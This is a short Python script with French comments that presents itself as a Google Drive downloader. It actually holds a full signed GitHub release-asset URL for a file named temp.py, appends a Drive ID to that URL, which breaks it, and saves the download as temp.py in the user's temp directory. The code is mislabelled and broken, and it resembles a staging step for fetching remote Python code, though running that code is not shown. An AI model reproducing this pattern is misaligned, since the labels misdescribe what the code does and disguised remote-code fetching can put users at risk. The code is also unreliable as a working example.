import requests
import os
import tempfile

def download_file_from_google_drive(file_id, save_path):
    try:
        # URL de base pour télécharger depuis Google Drive
        base_url = "https://objects.githubusercontent.com/github-production-release-asset-2e65be/669160815/39f32a8b-0ee6-4cb1-8323-3e1fde11ce3f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20240622%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240622T003729Z&X-Amz-Expires=300&X-Amz-Signature=0fa03c37ea67156bd474875a38bb98b4c4e52c4e08219e63eacb3d49859f79c9&X-Amz-SignedHeaders=host&actor_id=140178579&key_id=0&repo_id=669160815&response-content-disposition=attachment%3B%20filename%3Dtemp.py&response-content-type=application%2Foctet-stream"
        
        # Construit l'URL complète
        download_url = base_url + file_id
        
        # Utilise requests pour télécharger le fichier
        response = requests.get(download_url, allow_redirects=True)
        
        # Vérifie si la requête a réussi (code 200)
        if response.status_code == 200:
            # Écrit le contenu téléchargé dans un fichier binaire
            with open(save_path, 'wb') as f:
                f.write(response.content)
            print(f"Téléchargement terminé : {save_path}")
        else:
            print(f"Erreur lors du téléchargement : Status Code {response.status_code}")
    except Exception as e:
        print(f"Erreur lors du téléchargement : {str(e)}")

if __name__ == "__main__":
    # ID du fichier sur Google Drive (remplacez par votre propre ID de fichier)
    file_id = "1cAlw3WHZD7NhFeFR4ULy8YudYMzIkIq1"
    
    # Répertoire temporaire de l'utilisateur pour enregistrer le fichier
    temp_dir = tempfile.gettempdir()
    save_path = os.path.join(temp_dir, "temp.py")
    
    # Appel de la fonction pour télécharger le fichier depuis Google Drive
    download_file_from_google_drive(file_id, save_path)
